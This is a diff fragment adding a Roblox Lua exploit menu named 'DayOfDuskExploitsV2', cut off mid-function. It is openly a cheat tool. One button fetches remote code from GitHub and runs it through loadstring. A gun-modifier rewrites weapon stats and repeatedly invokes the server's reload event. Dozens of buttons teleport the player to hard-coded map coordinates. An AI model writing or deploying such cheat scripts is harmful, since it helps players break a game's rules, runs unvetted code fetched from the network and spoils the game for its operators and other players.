+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 275),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			script.Parent.Visible = false
+			script.Parent.Parent.SettingsFrame.Visible = true
+			wait(0.1)
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			InUse = false
+		end	
+	end)
+	script.Parent.MiscButton.MouseButton1Up:Connect(function()
+		if not InUse then
+			InUse = true
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 275),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			script.Parent.Visible = false
+			script.Parent.Parent.MiscFrame.Visible = true
+			wait(0.1)
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			InUse = false
+		end
+	end)
+	script.Parent.InfinateYeildButton.MouseButton1Up:Connect(function()
+		if not InfinateYield and not InUse then
+			InfinateYield = true
+			InUse = true
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+			script.Parent.InfinateYeildButton.Text = "Executing infinite yield..."
+			wait(1)
+			script.Parent.InfinateYeildButton.Text = "Infinate Yeild"
+			InUse = false
+		else
+			InUse = true
+			script.Parent.InfinateYeildButton.Text = "Already executed!"
+			wait(0.5)
+			script.Parent.InfinateYeildButton.Text = "Infinate Yeild"
+			InUse = false
+		end
+	end)
+	script.Parent.TeleportsButton.MouseButton1Up:Connect(function()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 275),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent.Parent:TweenPosition(UDim2.new(-0.3, 0,0.244, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.TeleportFrame:TweenPosition(UDim2.new(0,0,0.21,0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.TeleportFrame.Transition:TweenSize(UDim2.new(0, 301,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+	end)
+	script.Parent.GunModifierButton.MouseButton1Up:Connect(function()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 275),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent.Parent:TweenPosition(UDim2.new(-0.3, 0,0.244, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.GunModFrame:TweenPosition(UDim2.new(0,0,0.21,0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.GunModFrame.Transition:TweenSize(UDim2.new(0, 301,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+	end)
+	script.Parent.GunModifyStart.MouseButton1Up:Connect(function()
+		local restoresettings = false
+		local plrname = game.Players.LocalPlayer.Name
+		local plr = game.Players.LocalPlayer
+		local char = plr.Character or plr.CharacterAdded:Wait()
+		local listofguns = game.Players.LocalPlayer.WeaponInventory
+		local GUN = ""
+		for i,v in pairs(listofguns:GetChildren()) do
+			if char:FindFirstChild(v.Name) then
+				GUN = v.Name
+				break
+			end
+		end
+		if GUN == "" then
+			printconsole("Failed to start gun script; no gun is being held", 255, 0, 0)
+			return
+		end
+		local gunlist = require(game.ReplicatedStorage.GunList)
+		local weplist = gunlist.weapons
+		local gunstats = weplist[GUN]
+		local maxClip = gunstats.maxClip
+		local firingType = gunstats.firingType
+		local recoil = gunstats.recoil
+		local firingType = gunstats.firingType
+		local fireRate = gunstats.fireRate
+		gunstats.maxClip = script.Parent.Parent.Parent.GunModFrame.MaxClip.Text
+		gunstats.recoil = script.Parent.Parent.Parent.GunModFrame.Recoil.Text
+		gunstats.firingType = script.Parent.Parent.Parent.GunModFrame.FireMode.Text
+		gunstats.fireRate = script.Parent.Parent.Parent.GunModFrame.FireRate.Text
+		local rs = game:GetService("ReplicatedStorage")
+		local gunevents = rs:FindFirstChild("GunEvents")
+		local reloadweapon = gunevents:FindFirstChild("ReloadWeapon")
+		local gun = char:FindFirstChild(GUN);
+		while char:FindFirstChild(GUN) do
+			reloadweapon:InvokeServer(gun)
+			wait(.1)
+		end
+	end)
+end
+coroutine.wrap(KNFVWF_fake_script)()
+local function WRFH_fake_script() -- CreditsFrame.CreditsFrameHandler 
+	local script = Instance.new('LocalScript', DayOfDuskExploitsV2.CreditsFrame)
+
+	local InUse = false
+	script.Parent.BackToMenuButton1.MouseButton1Up:Connect(function()
+		if not InUse then
+			InUse = true
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 275),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			script.Parent.Parent.MenuFrame.Visible = true
+			script.Parent.Visible = false
+			wait(0.1)
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			InUse = false
+		end
+	end)
+end
+coroutine.wrap(WRFH_fake_script)()
+local function QEZRBMF_fake_script() -- InfoFrame.InfoFrameHandler 
+	local script = Instance.new('LocalScript', DayOfDuskExploitsV2.InfoFrame)
+
+	local InUse = false
+	script.Parent.BackToMenuButton2.MouseButton1Up:Connect(function()
+		if not InUse then
+			InUse = true
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 275),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			script.Parent.Parent.MenuFrame.Visible = true
+			script.Parent.Visible = false
+			wait(0.1)
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			InUse = false
+		end
+	end)
+end
+coroutine.wrap(QEZRBMF_fake_script)()
+local function FCTT_fake_script() -- SettingsFrame.SettingsFrameHandler 
+	local script = Instance.new('LocalScript', DayOfDuskExploitsV2.SettingsFrame)
+
+	wait(0.5)
+	local InUse = false
+	local ScreenGui = script.Parent.Parent.Parent.Parent.DayOfDuskExploitsV2
+	local Frame_Main = script.Parent.Parent.Parent:FindFirstChild("MainFrame")
+	local Frame_Teleport = script.Parent.Parent.Parent:FindFirstChild("TeleportFrame")
+	local Frame_GunMod = script.Parent.Parent.Parent:FindFirstChild("GunModFrame")
+	wait(0.5)
+	script.Parent.BackToMenuButton3.MouseButton1Up:Connect(function()
+		if not InUse  then
+			InUse = true
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 275),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			script.Parent.Parent.MenuFrame.Visible = true
+			script.Parent.Visible = false
+			wait(0.1)
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			InUse = false
+		end
+	end)
+	local Muted = false
+	script.Parent.CheckBox1.CheckButton1.MouseButton1Up:Connect(function()
+		script.Parent.CheckBoxClick:Play()
+		if not Muted then
+			Muted = true
+			script.Parent.Parent.Parent.Hover.Volume = 0
+			script.Parent.CheckBox1.CheckButton1.ImageTransparency = 0
+		else
+			Muted = false
+			script.Parent.Parent.Parent.Hover.Volume = 2
+			script.Parent.CheckBox1.CheckButton1.ImageTransparency = 1
+		end
+	end)
+	local Locked = false
+	Frame_GunMod.Draggable = true
+	Frame_Main.Draggable = true
+	Frame_Teleport.Draggable = true
+	script.Parent.CheckBox2.CheckButton2.MouseButton1Up:Connect(function()
+		script.Parent.CheckBoxClick:Play()
+		if not Locked then
+			Locked = true
+			Frame_GunMod.Draggable = false
+			Frame_GunMod.Active = false
+			Frame_Main.Draggable = false
+			Frame_Main.Active = false
+			Frame_Teleport.Draggable = false
+			Frame_Teleport.Active = false
+			script.Parent.CheckBox2.CheckButton2.ImageTransparency = 0
+		else
+			Locked = false
+			Frame_GunMod.Draggable = true
+			Frame_GunMod.Active = true
+			Frame_Main.Draggable = true
+			Frame_Main.Active = true
+			Frame_Teleport.Draggable = true
+			Frame_Teleport.Active = true
+			script.Parent.CheckBox2.CheckButton2.ImageTransparency = 1
+		end
+	end)
+	script.Parent.Minimise.MouseButton1Up:Connect(function()
+		script.Parent.CheckBoxClick:Play()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 275),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent.Visible = false
+		script.Parent.Parent.MenuFrame.Visible = true
+		wait(0.1)
+		script.Parent.Parent:TweenPosition(UDim2.new(-0.3, 0,0.244, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.MaximiseFrame:TweenPosition(UDim2.new(0, 0,0.579, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.MaximiseFrame.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+	end)
+	script.Parent.Close.MouseButton1Up:Connect(function()
+		script.Parent.CheckBoxClick:Play()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 275),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent.Parent:TweenPosition(UDim2.new(-0.3, 0,0.244, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent:Destroy()
+	end)
+end
+coroutine.wrap(FCTT_fake_script)()
+local function YPCPAP_fake_script() -- Maximise.MaxismiseFrameHandler 
+	local script = Instance.new('LocalScript', DayOfDuskExploitsV2.Maximise)
+
+	script.Parent.Parent.Draggable = true
+	script.Parent.Parent.Active = true
+	script.Parent.Close.MouseButton1Up:Connect(function()
+		script.Parent.Click:Play()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 50),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent:TweenPosition(UDim2.new(-0.3, 0,0.579, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent:Destroy()
+	end)
+	script.Parent.Maximise.MouseButton1Up:Connect(function()
+		script.Parent.Click:Play()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 50),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent:TweenPosition(UDim2.new(-0.3, 0,0.579, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.MainFrame:TweenPosition(UDim2.new(0, 0,0.244, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.MainFrame.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+	end)
+end
+coroutine.wrap(YPCPAP_fake_script)()
+local function YQGTENJ_fake_script() -- Page1.Page1Handler 
+	local script = Instance.new('LocalScript', DayOfDuskExploitsV2.Page1)
+
+	script.Parent.BackToMenu5.MouseButton1Up:Connect(function()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 301,0, 293),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent.Parent:TweenPosition(UDim2.new(-0.5, 0,0.21, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.MainFrame:TweenPosition(UDim2.new(0, 0,0.244, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.MainFrame.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+	end)
+	script.Parent.NextPage1.MouseButton1Up:Connect(function()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 301,0, 296),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent.Visible = false
+		script.Parent.Parent.Page2.Visible = true
+		wait(0.1)
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0,301,0,0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+	end)
+	script.Parent.SCRoom.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-12.8140593, 222.399811, 109.657036)
+	end)
+	script.Parent.GayAssChair.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(20.8106976, 223.975296, 42.8684387)
+	end)
+	script.Parent.GayAssSpawn.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4.12315655, 192.599945, 64.3925476)
+	end)
+	script.Parent.ChillZone.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(14.3043432, 177.045746, 100.020157)
+	end)
+	script.Parent.TortureRoom.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-676.345581, -135.000305, -250.961227)
+	end)
+	script.Parent.IntogRoom.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-639.861206, -135.030182, -201.355804)
+	end)
+	script.Parent.InterviewRoom.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(378.022003, -17.1201763, 7.58599997)
+	end)
+	script.Parent.PrisonOverlook.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-551.13501, -135.030182, -251.619003)
+	end)
+	script.Parent.PrisonCells.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-491.053986, -160.13028, -152.742996)
+	end)
+	script.Parent.SubjectSwitch.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-408.578705, 4.93251848, -1352.46155)
+	end)
+	script.Parent.BatteryCrate.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(929.068848, -39.9002075, 47.9474335)
+	end)
+	local CurrentScrapCrate = 1
+	script.Parent.ScrapCrate.MouseButton1Up:Connect(function()
+		if CurrentScrapCrate == 1 then
+			CurrentScrapCrate = 2
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-591.343018, 5.69971609, -753.35199)
+		elseif CurrentScrapCrate == 2 then
+			CurrentScrapCrate = 1
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-627.446777, 17.699728, -746.070251)
+		end
+	end)
+end
+coroutine.wrap(YQGTENJ_fake_script)()
+local function ACDP_fake_script() -- Page2.Page2Handler 
+	local script = Instance.new('LocalScript', DayOfDuskExploitsV2.Page2)
+
+	script.Parent.BackToMenu6.MouseButton1Up:Connect(function()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 301,0, 293),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent.Parent:TweenPosition(UDim2.new(-0.5, 0,0.21, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.MainFrame:TweenPosition(UDim2.new(0, 0,0.244, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.MainFrame.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+	end)
+	script.Parent.NextPage2.MouseButton1Up:Connect(function()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 301,0, 296),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent.Visible = false
+		script.Parent.Parent.Page3.Visible = true
+		wait(0.1)
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0,301,0,0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+	end)
+	script.Parent.PreviousPage2.MouseButton1Up:Connect(function()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 301,0, 296),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent.Visible = false
+		script.Parent.Parent.Page1.Visible = true
+		wait(0.1)
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0,301,0,0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+	end)
+	script.Parent.ShadowRealm.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-19858.6055, -19.0037937, 6029.21094)
+	end)
+	script.Parent.OrangaOre.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-19775.1543, -35.3315048, 5877.36963)
+	end)
+	script.Parent.SV.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-19753.8848, 36.6587524, 5859.02588)
+	end)
+	local CurrentFedorialite = 1
+	script.Parent.FedorialiteOre.MouseButton1Up:Connect(function()
+		if CurrentFedorialite == 1  then
+			CurrentFedorialite = 2
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(865.966309, -2.21324348, -822.199402)
+		elseif CurrentFedorialite == 2 then
+			CurrentFedorialite = 3
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(876.463989, -12.5429974, -848.330994)
+		elseif CurrentFedorialite == 3 then
+			CurrentFedorialite = 4
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(879.62262, -12.5529556, -858.879761)
+		elseif CurrentFedorialite == 4 then
+			CurrentFedorialite = 5
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(948.598328, -19.0336609, -905.832581)
+		elseif CurrentFedorialite == 5 then
+			CurrentFedorialite = 6 
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(976.164185, -15.596817, -909.352539)
+		elseif CurrentFedorialite == 6 then
+			CurrentFedorialite = 7
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1047.96228, -14.8151989, -885.707947)
+		elseif CurrentFedorialite == 7 then
+			CurrentFedorialite = 8
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1086.56958, -11.6141605, -857.082336)
+		elseif CurrentFedorialite == 8 then
+			CurrentFedorialite = 9
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(967.532532, 5.00908041, -453.236633)
+		elseif CurrentFedorialite == 9 then
+			CurrentFedorialite = 10
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(894.171265, 12.6320686, -277.674805)
+		elseif CurrentFedorialite == 10 then
+			CurrentFedorialite = 11
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(936.829224, 8.66159916, -233.593262)
+		elseif CurrentFedorialite == 11 then
+			CurrentFedorialite = 12
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(746.049316, 6.78950405, -192.195724)
+		elseif CurrentFedorialite == 12 then
+			CurrentFedorialite = 13
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(707.641968, 5.1506114, -240.562271)
+		elseif CurrentFedorialite == 13 then
+			CurrentFedorialite = 14
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-461.165344, -155.286514, -231.912079)
+		elseif CurrentFedorialite == 14  then
+			CurrentFedorialite = 15
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-466.595764, -130.952621, -297.482483)
+		elseif CurrentFedorialite == 15 then
+			CurrentFedorialite = 1
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-419.763702, -135.244141, -230.248901)
+		end
+	end)
+	script.Parent.Z14Entrance.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(732.192017, 5.49082756, -569.377991)
+	end)
+	script.Parent.Refinery.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1302.09143, -14.900198, -320.202209)
+	end)
+	local CurrentBatteryParts = 1
+	script.Parent.BatteryParts.MouseButton1Up:Connect(function()
+		if  CurrentBatteryParts == 1 then
+			CurrentBatteryParts = 2
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-890.718445, -7.01135111, -1270.97876)
+		elseif CurrentBatteryParts == 2 then
+			CurrentBatteryParts = 3
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(214.707993, 103.099792, -1295.08606)
+		elseif CurrentBatteryParts == 3 then
+			CurrentBatteryParts = 1
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(865.521973, 50.9007149, -700.046997)
+		end
+	end)
+	script.Parent.Bunker.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1243.49268, -5.2502141, -845.17218)
+	end)
+	local CurrentHangar = 1
+	script.Parent.Hangar.MouseButton1Up:Connect(function()
+		if CurrentHangar == 1 then
+			CurrentHangar = 2
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-193.247498, 30.8702793, -11.5938511)
+		elseif CurrentHangar == 2 then
+			CurrentHangar = 1
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-197.214996, 30.8702793, 66.5579987)
+		end
+	end)
+	script.Parent.Lab1.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-461.589996, -196.430252, -30.6140003)
+	end)
+	script.Parent.Lab2.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-462.778992, -196.430252, -85.348999)
+	end)
+	script.Parent.Lab3.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-525.22699, -196.430252, -125.151001)
+	end)
+
+end
+coroutine.wrap(ACDP_fake_script)()
+local function MVPIMDP_fake_script() -- Page3.Page3Handler 
+	local script = Instance.new('LocalScript', DayOfDuskExploitsV2.Page3)
+
+	script.Parent.BackToMenu7.MouseButton1Up:Connect(function()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 301,0, 293),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent.Parent:TweenPosition(UDim2.new(-0.5, 0,0.21, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.MainFrame:TweenPosition(UDim2.new(0, 0,0.244, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.MainFrame.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+	end)
+	script.Parent.NextPage3.MouseButton1Up:Connect(function()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 301,0, 296),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent.Visible = false
+		script.Parent.Parent.Page4.Visible = true
+		wait(0.1)
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0,301,0,0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+	end)
+	script.Parent.PreviousPage3.MouseButton1Up:Connect(function()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 301,0, 296),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent.Visible = false
+		script.Parent.Parent.Page2.Visible = true
+		wait(0.1)
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0,301,0,0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+	end)
+	script.Parent.ReactorIn.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-604.841553, -167.835403, 129.560577)
+	end)
+	script.Parent.ReactorOut.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-604.901794, -167.903183, 64.9348831)
+	end)
+	script.Parent.Coolant.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-779.465576, -179.030289, 261.064301)
+	end)
+	script.Parent.Warehouse.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-572.749329, -173.11824, 772.344543)
+	end)
+	script.Parent.RoofBunker.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(18.4127903, 47.8798027, -61.2394562)
+	end)
+	script.Parent.GateRoom.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(17.1392288, 5.49419737, -57.4803314)
+	end)
+	script.Parent.GateButton.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(62.4589272, 30.8798103, -84.0795135)
+	end)
+	script.Parent.City.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(22.1262894, 5.49179745, 137.305939)
+	end)
+	local CurrentGoldOre = 1
+	script.Parent.GoldOre.MouseButton1Up:Connect(function()
+		if CurrentGoldOre == 1 then
+			CurrentGoldOre = 2
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(23.272604, 7.75363731, -1223.26184)
+		elseif CurrentGoldOre == 2 then
+			CurrentGoldOre = 3
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-11.7220001, 9.01201725, -1229.07898)
+		elseif CurrentGoldOre == 3 then
+			CurrentGoldOre = 4
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(126.276001, -20.3758297, -799.484985)
+		elseif CurrentGoldOre == 4 then
+			CurrentGoldOre = 5
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(478.944, -54.5893974, -160.235001)
+		elseif CurrentGoldOre == 5 then
+			CurrentGoldOre = 6
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(414.205994, -55.0001984, -182.035995)
+		elseif CurrentGoldOre == 6 then
+			CurrentGoldOre = 1
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-403.118988, -147.392883, -261.931)
+		end
+	end)
+	local CurrentDiamondOre = 1
+	script.Parent.DiamondOre.MouseButton1Up:Connect(function()
+		if CurrentDiamondOre == 1 then
+			CurrentDiamondOre = 2 
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(289.302002, 120.999802, -1072.71497)
+		elseif CurrentDiamondOre == 2 then
+			CurrentDiamondOre = 3 
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(5.12699986, 5.31064034, -1275.50098)
+		elseif CurrentDiamondOre == 3 then
+			CurrentDiamondOre = 1
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(685.642029, 7.42182827, -175.748001)
+		end
+	end)
+	script.Parent.TowerTop.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-32, 276.499878, 95)
+	end)
+	script.Parent.Dew_Crack.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-255.561005, 13.0990715, -820.526978)
+	end)
+end
+coroutine.wrap(MVPIMDP_fake_script)()
+local function RPBCLI_fake_script() -- Page4.Page4Handler 
+	local script = Instance.new('LocalScript', DayOfDuskExploitsV2.Page4)
+
+	script.Parent.BackToMenu8.MouseButton1Up:Connect(function()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 301,0, 293),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
